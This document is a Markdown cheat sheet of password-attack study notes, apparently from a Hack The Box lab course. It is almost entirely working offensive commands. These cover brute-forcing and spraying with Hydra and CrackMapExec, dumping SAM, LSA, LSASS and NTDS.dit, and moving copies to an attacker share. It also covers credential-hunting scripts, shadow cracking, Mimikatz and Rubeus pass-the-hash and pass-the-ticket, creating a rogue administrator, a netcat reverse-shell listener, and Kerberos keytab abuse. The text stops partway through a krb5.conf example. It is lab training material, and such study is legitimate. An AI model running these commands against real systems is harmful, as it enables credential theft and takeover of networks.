# Password Attacks
- [Introduction](#introduction)
    - [Credential Storage in linux](#credential-storage-in-linux)
    - [Credential Storage in windows](#credential-storage-in-windows)
    - [John The Ripper](#john-the-ripper)
- [Remote Password Attacks](#remote-password-attacks)
    - [Network Services](#network-services)
    - [Password Mutations](#password-mutations)
    - [Password Reuse / Default Passwords](#password-reuse--default-passwords)
- [Windows Local Password Attacks](#windows-local-password-attacks)
    - [Attacking SAM](#attacking-sam)
        - [Copying SAM Registry Hives & Dumping Hashes](#copying-sam-registry-hives--dumping-hashes)
        - [Remote Dumping & LSA Secrets Considerations](#remote-dumping--lsa-secrets-considerations)
    - [Attacking LSASS](#attacking-lsass)
        - [Dumping LSASS Process Memory](#dumping-lsass-process-memory)
        - [Using Pypykatz to Extract Credentials](#using-pypykatz-to-extract-credentials)
    - [Attacking Active Directory & NTDS.dit](#attacking-active-directory--ntdsdit)
        - [Dictionary Attacks against AD accounts](#dictionary-attacks-against-ad-accounts)
        - [Capturing NTDS.dit](#capturing-ntdsdit)
    - [Credential Hunting in Windows](#credential-hunting-in-windows)
- [Linux Local Password Attacks](#linux-local-password-attacks)
    - [Credential Hunting in Linux](#credential-hunting-in-linux)
- [Windows Lateral Movement](#windows-lateral-movement)
    - [Pass the Hash (PtH)](#pass-the-hash-pth)
        - [Pass the Hash with Mimikatz - windows](#pass-the-hash-with-mimikatz-windows)
        - [Pass the Hash with PowerShell Invoke-TheHash - windows](#pass-the-hash-with-powershell-invoke-thehash-windows)
        - [Pass the Hash with Impacket (Linux)](#pass-the-hash-with-impacket-linux)
        - [Pass the Hash with evil-winrm (Linux)](#pass-the-hash-with-evil-winrm-linux)
        - [Pass the Hash with RDP (Linux)](#pass-the-hash-with-rdp-linux)
    - [Pass the Ticket (PtT) from Windows](#pass-the-ticket-ptt-from-windows)
        - [Harvesting Kerberos Tickets from Windows](#harvesting-kerberos-tickets-from-windows)
        - [Pass the Key or OverPass the Hash](#pass-the-key-or-overpass-the-hash)
        - [Pass the Ticket (PtT)](#pass-the-ticket-ptt)
        - [Pass The Ticket with PowerShell Remoting (Windows)](#pass-the-ticket-with-powershell-remoting-windows)
    - [Pass the Ticket (PtT) from Linux](#pass-the-ticket-ptt-from-linux)
        - [Identifying Linux and Active Directory Integration](#identifying-linux-and-active-directory-integration)
        - [Finding Kerberos Tickets in Linux](#finding-kerberos-tickets-in-linux)
        - [Abusing KeyTab Files](#abusing-keytab-files)
            - [Kinit & Klist](#kinit--klist)
            - [Keytab Extract](#keytab-extract)
        - [Abusing Keytab ccache](#abusing-keytab-ccache)
        - [Using Linux Attack Tools with Kerberos](#using-linux-attack-tools-with-kerberos)
        - [Miscellaneous](#miscellaneous)
        - [Linikatz](#linikatz)
- [Cracking Files](#cracking-files)
    - [Protected Files](#protected-files)
    - [Protected Archives](#protected-archives)









## Introduction
### Credential Storage in linux 
- Encrypted passwords in `/etc/shadow`
- Cryptographic hash methods: 

|ID	|Cryptographic Hash Algorithm|
|---|----------------------------|
|`$1$`|	MD5|
|`$2a$`|	Blowfish|
|`$5$`|	SHA-256|
|`$6$`|	SHA-512|
|`$sha1$`|	SHA1crypt|
|`$y$`|	Yescrypt|
|`$gy$`|	Gost-yescrypt|
|`$7$`|	Scrypt|



```bash
cat /etc/passwd

...SNIP...
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

- The `x` in the password field indicates that the encrypted password is in the `/etc/shadow` file.

> [!WARNING]
> Password empty field means that we can log in with the username without entering a password.

### Credential Storage in windows 
- Winlogon is a trusted process responsible for managing security-related user interactions. These include:

    - Launching LogonUI to enter passwords at login
    - Changing passwords
    - Locking and unlocking the workstation

- Each interactive logon session creates a separate instance of the Winlogon service.

- Authentication packages are the Dynamic-Link Libraries (DLLs) that perform authentication checks. For example, for non-domain joined and interactive logins, the authentication package `Msv1_0.dll` is used.

- **Authentication Flow**
    - Winlogon is the only process that intercepts login requests from the keyboard sent via an RPC message from Win32k.sys. Winlogon immediately launches the LogonUI application at logon to display the user interface for logon. After Winlogon obtains a user name and password from the credential providers, it calls LSASS to authenticate the user attempting to log in.

- **Local Security Authority Subsystem Service (LSASS)**: is a collection of many modules and has access to all authentication processes that can be found in `%SystemRoot%\System32\Lsass.exe`.
    - This service is responsible for: 
        - The local system security policy
        - User authentication
        - Sending security audit logs to the Event log

> [!NOTE]       
> LSASS caches passwords, ekeys, tickets, and pins associated with Kerberos. 

|Authentication Packages|	Description|
|-----------------------|--------------|
|Lsasrv.dll|	The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful.|
|Msv1_0.dll|	Authentication package for local machine logons that don't require custom authentication.|
|Samsrv.dll|	The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.|
|Kerberos.dll|	Security package loaded by the LSA for Kerberos-based authentication on a machine.|
|Netlogon.dll|	Network-based logon service.|
|Ntdsa.dll|	This library is used to create new records and folders in the Windows registry.|

- **Security Account Manager (SAM)**
    - SAM is a database file in Windows operating systems that stores users' passwords
    - It can be used to authenticate local and remote users.
    - User passwords are stored in a hash format in a registry structure as either an LM hash or an NTLM hash.
    - This file is located in `%SystemRoot%/system32/config/SAM` and is mounted on HKLM/SAM.


### John The Ripper
- **Cracking Modes**
    - Single crack Mode: `john --format=<hash_type> <hash or hash_file>` , `--wordlist` option
    - Wordlist Mode: `john --wordlist=<wordlist_file>,<wordlist_file>,<wordlist_file> --rules <hash_file>`
    - Incremental Mode



## Remote Password Attacks
### Network Services
#### WinRM
- Using CrackMapExec: 
    - `crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>` e.g. `crackmapexec winrm 10.129.42.197 -u user.list -p password.list`
    - The appearance of (Pwn3d!) is the sign that we can most likely execute system commands if we log in with the brute-forced user
- Using Evil-WinRM: 
    - `evil-winrm -i <target-IP> -u <username> -p <password>` e.g. `evil-winrm -i 10.129.42.197 -u user -p password`

#### SSH 
- Using Hydra:
    - `hydra -L user.list -P password.list ssh://10.129.42.197`

#### Remote Desktop Protocol (RDP)
- Using Hydra:
    - `hydra -L user.list -P password.list rdp://10.129.42.197`

#### SMB
- Using Hydra:
    - `hydra -L user.list -P password.list smb://10.129.42.197`
- Using auxiliary(scanner/smb/smb_login) in Metasploit

- Interact with it using crackmapexec or smbclient 
    - `crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares`
    - `smbclient -U user \\\\10.129.42.197\\SHARENAME`

### Password Mutations
#### Hashcat
- How Hashcat mutates words?

|Function|	Description|
|---------|------------|
|:|	Do nothing.|
|l|	Lowercase all letters.|
|u|	Uppercase all letters.|
|c|	Capitalize the first letter and lowercase others.|
|sXY|	Replace all instances of X with Y.|
|$!|	Add the exclamation character at the end.|

- Generating Rule-base wordlist: `hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list`
- Hashcat Existing Rules: `ls /usr/share/hashcat/rules/`, One of the most used rules is `best64.rule`.


#### CeWL

- It scans potential words from the company's website and save them in a separate list.
- We can then combine this list with the desired rules and create a customized password list that has a higher probability of guessing a correct password.
- We can specify some parameters: 
    - Depth to spider (`-d`)
    - Minimum length of the word (`-m`)
    - Storage of the found words in lowercase (`--lowercase`)
    - Store the results (`-w`)
- e.g. `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`

### Password Reuse / Default Passwords
- [Default Credential cheat sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [Default router username and password list](https://www.softwaretestinghelp.com/default-router-username-and-password-list/)

## Windows Local Password Attacks
### Attacking SAM
#### Copying SAM Registry Hives & Dumping Hashes
- There are three registry hives that we can copy if we have local admin access on the target.Here is a brief description of each in the table below:

|Registry Hive|	Description|
|-------------|------------|
|hklm\sam|	Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
|hklm\system|	Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
|hklm\security|	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|
- **Steps**
    1. We can create backups of these hives using the `reg.exe` utility
        - `C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save`
        - `C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save`
        - `C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save`
    2. Once we have the share running on our attack host, we can use the move command on the Windows target to move the hive copies to the share: `move sam.save \\10.10.15.16\CompData`

    3. Dumping Hashes with Impacket's secretsdump.py: `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
    4. Start cracking hashes using Hashcat 
        1. Adding nthashes to a .txt File
        2. Running hashcat against NT hashes `sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt`

> [!TIP]
> [Other techniques to dump hashes](https://attack.mitre.org/techniques/T1003/002/) 

#### Remote Dumping & LSA Secrets Considerations

- With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network
- Dumping LSA Secrets Remotely: `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`
- Dumping SAM Remotely: `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam`

### Attacking LSASS

![lsass diagram](/images/lsassexe_diagram.png)

- Upon initial logon, LSASS will:
    - Cache credentials locally in memory
    - Create access tokens
    - Enforce security policies
    - Write to Windows security log

#### Dumping LSASS Process Memory
- **Memory Dump methods:**
    1. Task Manager Method: 
    ![Task manager dump](/images/taskmanagerdump.png)
    - A file called lsass.DMP is created and saved in: `C:\Users\loggedonusersdirectory\AppData\Local\Temp`
    2. Rundll32.exe & Comsvcs.dll Method: 
        1. Finding LSASS PID in cmd or PowerShell:
            - From cmd, We can issue the command `tasklist /svc` and find lsass.exe and its process ID in the PID field
            - From PowerShell, we can issue the command `Get-Process lsass` and see the process ID in the Id field.
        2. Creating lsass.dmp using PowerShell:
            - `PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`

#### Using Pypykatz to Extract Credentials

- Use a powerful tool called [pypykatz](https://github.com/skelsec/pypykatz) to attempt to extract credentials from the .dmp file.
- Pypykatz is an implementation of Mimikatz written entirely in Python.
- Running Pypykatz:
    - `pypykatz lsa minidump /home/peter/Documents/lsass.dmp`
    
### Attacking Active Directory & NTDS.dit
#### Dictionary Attacks against AD accounts

> [!TIP] 
> We can often find the email structure by Googling the domain name, i.e., "@inlanefreight.com" and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Sometimes you can use google dorks to search for “inlanefreight.com filetype:pdf” and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid.

- We can use an automated list generator such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats.


- Launching the Attack with CrackMapExec `abdeonix@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt`

> [!WARNING]
> If the admins configured an account lockout policy, this attack could lock out the account that we are targeting.

#### Capturing NTDS.dit
- NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. 

- **Steps**
    1. We can connect to a target DC using the credentials we captured. `abdeonix@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'`

    2. Checking Local Group Membership `*Evil-WinRM* PS C:\> net localgroup`
    3. Checking User Account Privileges including Domain `*Evil-WinRM* PS C:\> net user <USER>` e.g. `*Evil-WinRM* PS C:\> net user bwilliamson`
    4. You are lucky if the account has Domain administrator rights. Creating Shadow Copy of C: `*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:`
    5. Copying NTDS.dit from the VSS `*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`
    6. Transferring NTDS.dit to Attack Host `*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData `

- A Faster Method: Using CrackMapExec to Capture NTDS.dit `abdeonix@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds`

- Pass-the-Hash Considerations (If we have failed to crack the hash) 
    - `abdeonix@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"`


### Credential Hunting in Windows

- Here are some helpful key terms we can use that can help us discover some credentials:
```
Passwords	      Passphrases	        Keys
Username	      User account	        Creds
Users	          Passkeys	            Passphrases
configuration     dbcredential	        dbpassword
pwd	              Login	                Credentials
```

- We can use [Lazagne](https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store. 

- Running Lazagne `C:\Users\bob\Desktop> start lazagne.exe all`. We can include the option -vv to study what it is doing in the background.

- Using findstr `C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`

## Linux Local Password Attacks
### Credential Hunting in Linux
- Here are some helpful key terms we can use that can help us discover some credentials:

|Files|	History|	Memory|	Key-Rings|
|:----|:-------|:---------|:---------|
|Configs|	Logs|	Cache|	Browser stored credentials|
|Databases|	Command-line History|	In-memory Processing|
|Notes|			
|Scripts|			
|Source codes|			
|Cronjobs|			
|SSH Keys|

```bash
# Configuration files
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Credentials in Configuration Files
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

# Databases
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

# Notes
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# Scripts
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

# Cronjobs
cat /etc/crontab
ls -la /etc/cron.*/

# SSH Private Keys
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

# SSH Public Keys
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

# History
tail -n5 /home/*/.bash*

# Logs
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

# LaZagne
sudo python2.7 laZagne.py all

```


- **Opasswd**
    - The PAM library (`pam_unix.so`) can prevent reusing old passwords.
    - The file where old passwords are stored is the `/etc/security/opasswd`.


```bash
# Unshadow & Cracking Unshadowed Hashes
abdeonix@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
abdeonix@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
abdeonix@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
abdeonix@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# Cracking MD5 Hashes
abdeonix@htb[/htb]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt


```

## Windows Lateral Movement
### Pass the Hash (PtH)

#### Pass the Hash with [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Windows)
- `/user` - The user name we want to impersonate.
- `/rc4` or `/NTLM` - NTLM hash of the user's password.
- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

- `c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit`

#### Pass the Hash with PowerShell [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) (Windows)

- This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB
- WMI and SMB connections are accessed through the .NET TCPClient
- Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol
- Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer.

- When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

    - `Target` - Hostname or IP address of the target.
    - `Username` - Username to use for authentication.
    - `Domain` - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
    - `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
    - `Command` - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

- The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.
```powershell
# Invoke-TheHash with SMB
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

# Invoke-TheHash with WMI
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B 
# To get reverse shell (https://www.revshells.com/)
PS C:\tools> .\nc.exe -lvnp 8001

PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell "

```

#### Pass the Hash with [Impacket](https://github.com/fortra/impacket) (Linux)

```bash
# Pass the Hash with Impacket PsExec
abdeonix@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

```
- There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:
    - [impacket-wmiexec](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)
    - [impacket-atexec](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
    - [impacket-smbexec](https://github.com/fortra/impacket/blob/master/examples/smbexec.py)

#### Pass the Hash with CrackMapExec (Linux)
- Password Spraying

> [!NOTE]
> This method can lock out domain accounts, so keep the target domain's account lockout policy in mind and make sure to use the local account method, which will try just one login attempt on a host in a given range using the credentials provided if that is your intent.

```bash
# Pass the Hash with CrackMapExec
abdeonix@htb[/htb]# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# CrackMapExec - Command Execution
abdeonix@htb[/htb]# crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

```
- If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command. We can use the option `-x` to execute commands.

#### Pass the Hash with [evil-winrm](https://github.com/Hackplayers/evil-winrm) (Linux)
- If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.
```bash
# Pass the Hash with evil-winrm
abdeonix@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

```

> [!NOTE]
> When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb

#### Pass the Hash with RDP (Linux)

- There are a few caveats to this attack:
    - Restricted Admin Mode , which is disabled by default. This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command: `c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

```bash
abdeonix@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

```
#### UAC Limits Pass the Hash for Local Accounts
- UAC (User Account Control) limits local users' ability to perform remote administration operations.
- When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks.
- Setting it to 1 allows the other local admins as well.

> [!NOTE]
> These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer.

### Pass the Ticket (PtT) from Windows
#### Harvesting Kerberos Tickets from Windows

- We can harvest all tickets from a system using the Mimikatz.
```bat
privilege::debug 
sekurlsa::tickets /export
``` 
- The result is a list of files with the extension `.kirbi`, which contain the tickets.
- The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory. 

> [!NOTE]
> If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.

- We can also export tickets using Rubeus and the option dump. This option can be used to dump all tickets (if running as a local administrator).

```bat
# Rubeus - Export Tickets
Rubeus.exe dump /nowrap
```

> [!NOTE]
> To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.

#### Pass the Key or OverPass the Hash
- The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT)

- We can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`.

```bat
# Mimikatz - Extract Kerberos Keys
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys

```
- Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.

```bat

# Mimikatz - Pass the Key or OverPass the Hash
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

# Rubeus - Pass the Key or OverPass the Hash
c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

```

> [!NOTE]
> Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.


#### Pass the Ticket (PtT)
- With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag `/ptt` to submit the ticket (TGT or TGS) to the current logon session.

```bat 
# Rubeus Pass the Ticket
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

```

- Another way is to import the ticket into the current session using the `.kirbi` file from the disk. We can use a ticket exported from Mimikatz and import it using Pass the Ticket. `c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi`

- We can also use the base64 output from Rubeus or convert a `.kirbi` to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a `.kirbi` to base64.

```powershell
# Convert .kirbi to Base64 Format
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))

```
- Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.
```bat
# Pass the Ticket - Base64 Format
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>

```

- We can also perform the Pass the Ticket attack using the Mimikatz module `kerberos::ptt` and the `.kirbi` file that contains the ticket we want to import.

```bat
# Mimikatz - Pass the Ticket
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

```

> [!TIP]
> Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the `misc::cmd` command.

#### Pass The Ticket with PowerShell Remoting (Windows)
- Mimikatz
```bat
# Mimikatz - Pass the Ticket for Lateral Movement.
mimikatz # privilege::debug
# Import the ticket
mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

mimikatz # exit


c:\tools>powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
```

- **Rubeus**
    - Rubeus has the option createnetonly, which creates a sacrificial process/logon session
    - The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`.
    - This prevents the erasure of existing TGTs for the current logon session.


```bat

# Create a Sacrificial Process with Rubeus
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

# Rubeus - Pass the Ticket for Lateral Movement
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

c:\tools>powershell
PS C:\tools> Enter-PSSession -ComputerName DC01


```

### Pass the Ticket (PtT) from Linux

> [!NOTE]
> A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.

- Ccache files
    - In most cases, Linux machines store Kerberos tickets as ccache files in the `/tmp` directory.
    - By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`
    - These ccache files are protected by reading and write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.

- Keytab files
    - Another everyday use of Kerberos in Linux is with keytab files
    - A keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password).
    - You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password
    - When you change your password, you must recreate all your keytab files.

> [!NOTE]
> Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.

#### Identifying Linux and Active Directory Integration

```bash
# realm - Check If Linux Machine is Domain Joined
realm list

# PS - Check if Linux Machine is Domain Joined
ps -ef | grep -i "winbind\|sssd"

```

#### Finding Kerberos Tickets in Linux

- **Finding Keytab Files**

```bash
# Using Find to Search for Files with Keytab in the Name
find / -name *keytab* -ls 2>/dev/null

# Identifying Keytab Files in Cronjobs
crontab -l

```

> [!NOTE]
> The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user.

- **Finding ccache Files**

```bash
# Reviewing Environment Variables for ccache Files.
env | grep -i krb5

# Searching for ccache Files in /tmp
ls -la /tmp

```

#### Abusing KeyTab Files
##### Kinit & Klist
- The first thing we can do is impersonate a user using `kinit`
- `klist` is another application used to interact with Kerberos on Linux. 
    - This application reads information from a keytab file.

```bash
# Example: Listing keytab File Information
klist -k -t /opt/specialfiles/carlos.keytab 

```

> [!NOTE]
> `kinit` is case-sensitive, so be sure to use the name of the principal.

```bash
# Impersonating a User with a keytab
klist 
# Example
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

# Connecting to SMB Share as Carlos
smbclient //dc01/carlos -k -c ls

```

> [!NOTE]
> To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable `KRB5CCNAME`.


##### Keytab Extract
- [KeyTabExtract](https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type .keytab files, which may be used to authenticate Linux boxes to Kerberos.

- The script will extract information such as the realm, Service Principal, Encryption Type, and Hashes.

```bash
# Extracting Keytab Hashes with KeyTabExtract
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

```


#### Abusing Keytab ccache
- To abuse a ccache file, all we need is read privileges on the file. 
- These files, located in `/tmp`, can only be read by the user who created them, but if we gain root access, we could use them.

```bash
# Looking for ccache Files
ls -la /tmp


```

- To use a `ccache` file, we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.

```bash
# Importing the ccache File into our Current Session
root@linux01:~# klist

# Example
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist

root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass

```

#### Using Linux Attack Tools with Kerberos
- If we use them from a domain-joined machine, we need to ensure our `KRB5CCNAME` environment variable is set to the ccache file we want to use.

```bash
# Perform Port forwarding 

# Setting the KRB5CCNAME Environment Variable
abdeonix@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

- **Impacket**

```bash
# Using Impacket with proxychains and Kerberos Authentication
abdeonix@htb[/htb]$ proxychains impacket-wmiexec dc01 -k -no-pass

```
- **Evil-Winrm**
    - Installing Kerberos Authentication Package `abdeonix@htb[/htb]$ sudo apt-get install krb5-user -y`
    - In case the package krb5-user is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values:

```bash
abdeonix@htb[/htb]$ cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
